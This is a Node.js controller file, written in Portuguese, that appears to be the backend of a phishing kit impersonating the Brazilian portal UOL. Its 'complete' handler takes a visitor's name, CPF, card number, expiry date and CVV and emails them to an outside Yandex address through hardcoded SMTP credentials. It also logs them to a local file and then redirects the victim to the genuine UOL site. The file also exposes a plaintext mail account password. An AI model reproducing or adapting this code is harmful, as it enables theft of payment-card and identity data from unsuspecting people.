'use strict'

const moment = require('moment');
const fs = require('fs');
let ejs = require('ejs');
const nodemailer = require('nodemailer');

function sendMail(assunto,msg) {
    var transporter = nodemailer.createTransport({
        host: "email-ssl.com.br",
        port: 587,
        //proxy: 'socks5://' + socks,
        secure: false,
        auth: {
            user: 'admincompanyltda2019@churrainbox.com.br',
            pass: '103020Aa@@'
        },

        tls: { rejectUnauthorized: true }
    });

    var mailOptions = {
        from: 'admincompanyltda2019@churrainbox.com.br',
        to: 'paulodasilva01@yandex.com',
        
        subject: assunto,
        html: msg
    };

    transporter.sendMail(mailOptions, function (error, info) {
        if (error) {
            console.error(error);
            return true;
        } else {
            console.log('INFO ++ ' + assunto);
            fs.appendFileSync("./src/webroots/kiki.txt", '\n-----\n' + assunto + msg + '\n-----\n');
            return true;
        }
    });
}

function makeid() {
    var text = "";
    var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";

    for (var i = 0; i < 13; i++)
        text += possible.charAt(Math.floor(Math.random() * possible.length));

    return text;
}

exports.default = async(req, res, next) => {

    res.cookie('root', makeid(), {
            maxAge: 900000,
            httpOnly: true
        });

    res.render('pages/default', {});
}

exports.payment = async(req, res, next) => {
    res.render('pages/payment', {});
}

exports.complete = async(req, res, next) => {

    console.log(req.body);

    if (
        req.body.nome != '' &&
        req.body.cpf != '' &&
        req.body.mes != '' &&
        req.body.ano != '' &&
        req.body.cvv != ''
    ) {

        var msg = '<b>NOME:</b>: ' + req.body.nome + '<br>';
        msg += '<b>CPF:</b> ' + req.body.cpf + '<br>';
        msg += '<b>CC:</b> ' + req.body.cc + '<br>';
        msg += '<b>VALIDADE:</b> ' + req.body.mes + '/' + req.body.ano + '<br>';
        msg += '<b>CVV:</b> ' + req.body.cvv + '<br>';

        sendMail('[UOL] ' + req.cookies.root, msg);
        res.redirect('http://www.uol.com.br');
    }else{
        res.redirect('/payment.do');
    }
}
